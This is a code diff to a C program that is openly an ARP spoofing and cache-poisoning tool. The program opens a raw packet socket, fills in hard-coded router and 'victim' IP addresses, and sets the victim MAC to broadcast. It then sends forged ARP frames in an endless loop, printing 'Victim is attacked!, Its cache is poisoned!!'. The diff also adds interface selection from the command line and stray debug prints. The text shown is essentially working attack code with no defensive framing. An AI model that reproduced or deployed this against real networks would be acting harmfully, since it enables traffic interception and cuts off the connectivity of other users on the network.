@@ -34,8 +34,8 @@ struct _arp_hdr {
 
 /* Fill in router's IP Address here 
    Fill in victim's IP Address here */
-char* router_ip = "192.168.2.1";
-char* victim_ip = "192.168.2.3";
+char* router_ip = "10.87.0.1";
+char* victim_ip = "192.168.42.209";
 
 
 
@@ -52,12 +52,12 @@ void fill_victims_MAC(uint8_t* buff)
 	buff[5] = 0xFA;
 */
 	
-	buff[0] = 0x78;
-	buff[1] = 0xE4;
-	buff[2] = 0x00;
-	buff[3] = 0x0C;
-	buff[4] = 0xDB;
-	buff[5] = 0x2F;
+	buff[0] = 0xFF;
+	buff[1] = 0xFF;
+	buff[2] = 0xFF;
+	buff[3] = 0xFF;
+	buff[4] = 0xFF;
+	buff[5] = 0xFF;
 }
 
 
@@ -131,8 +131,18 @@ int get_if_no(char* if_name)
 }
 
 
-int main()
+int main(int argc, char* argv[])
 {
+		if( argc > 2 )
+		{
+			printf("Invalid args\n");
+			exit(EXIT_FAILURE);
+		}
+		else if( argc < 2 )
+		{
+			printf("Not enough arguments\n");
+			exit(EXIT_FAILURE);
+		}
 		int i;
 		int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
 		if( fd == -1 )
@@ -141,6 +151,7 @@ int main()
 			exit(EXIT_FAILURE);
 		}
 		
+		printf("Socket created!");
 		
 		uint8_t* buffer = create_buffer(FRAME_SIZE);
 		
@@ -193,7 +204,7 @@ int main()
 
 		/*index of the network device*/
 		
-		socket_address.sll_ifindex  = get_if_no("wlan0");
+		socket_address.sll_ifindex  = get_if_no(argv[1]);
 		
 		//socket_address.sll_ifindex  = 1;
 
@@ -216,6 +227,8 @@ int main()
 		//socket_address.sll_addr[6]  = 0x00;/*not used*/
 		//socket_address.sll_addr[7]  = 0x00;/*not used*/
 
+		printf("SAFasF");
+		
 		int n = 0;
 		while( 1 )
 		{
@@ -224,8 +237,8 @@ int main()
 				perror("Error sending\n");
 				exit(0);
 			}
-			printf("Victim is attacked!, Its internet connectivity is gone!\n");
-			sleep(0.5);
+			printf("Victim is attacked!, Its cache is poisoned!!");
+			sleep(1);
 			n++;
 		}
 		
